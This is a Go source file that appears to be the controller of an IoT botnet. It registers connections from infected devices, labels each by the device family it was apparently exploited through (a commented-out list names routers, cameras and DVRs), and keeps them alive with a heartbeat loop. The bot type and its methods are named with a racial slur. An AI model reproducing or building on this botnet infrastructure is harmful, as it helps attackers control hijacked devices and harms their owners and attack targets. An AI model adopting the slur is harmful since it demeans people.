package slave_v2

import (
	"fmt"
	"net"
	"regexp"
	"strings"
	"time"
)

func Handle(conn net.Conn, architecture, version, source, cores, ram string) {

	client := &Nigger{
		Conn:    conn,
		Source:  source,
		Version: version,
		Arch:    architecture,
		Cores:   cores,
		RAM:     ram,
	}

	client.Source = strings.ToLower(client.Source)

	// Mapping of source strings to corresponding client sources
	mapping := map[string]string{
		/*"goahead":   "smarttoaster",
		"dlink":     "smartwatch",
		"fiberrt":   "fiber",
		"avtech":    "avtech",
		"arm7":      "avtech",
		"c.":        "buttplug",
		"dvr":       "buttplug",
		"ipcam":     "buttplug",
		"r190w":     "cnpilot",
		"iphone":    "china",
		"gponfiber": "boa",
		"boa":       "boa",
		"gpon":      "boa",
		"nigger":    "fiber",
		"zhone":     "smartwatch",
		"weed":      "smartwatch",
		"baicells":  "smartwatch",
		"hongdian":  "smartwatch",
		"ruckus":    "smartwatch",
		"dm900":     "smartwatch",
		"lilin":     "buttplug",
		"jaws":      "smartwatch",
		"gozy":      "smartwatch",
		"utt":       "smartwatch",
		"gargoyle":  "smartwatch",
		"ruijie":    "smartwatch",
		"brr":       "brazil",
		"spain":     "buttplug",
		"cnr":       "boa",
		"asus":      "samsungfridge",
		"newzte":    "zte",
		"telecom":   "samsungfridge",
		"china":     "smartwatch",
		"wavlink":   "smartwatch",
		"webproc":   "smartwatch",
		"faith":     "smartwatch",
		"totolink":  "smartwatch",*/
	}

	for key, value := range mapping {
		if strings.Contains(source, key) {
			client.Source = value
		}
	}

	reg := regexp.MustCompile("[^a-zA-Z0-9.-]")
	if reg.MatchString(client.Source) {
		return
	}

	if len(client.Source) <= 1 {
		return
	}

	if client.Source == "e" {
		return
	}

	if client.Source == "teastick-telnet" {
		return
	}

	if client.Source == "teastick-lillin" {
		return
	}

	if strings.Contains(client.Source, "00000000") {
		return
	}

	List.AddNigger(client)
	defer List.TerminateNigger(client)

	defer func() {
		if r := recover(); r != nil {
			err := fmt.Errorf("recovered from panic: %v", r)
			fmt.Println(err)
		}
	}()

	buf := make([]byte, 2)
	for {
		client.Conn.SetDeadline(time.Now().Add(180 * time.Second))
		if n, err := client.Conn.Read(buf); err != nil || n != len(buf) {
			return
		}
		if n, err := client.Conn.Write(buf); err != nil || n != len(buf) {
			return
		}
	}
}
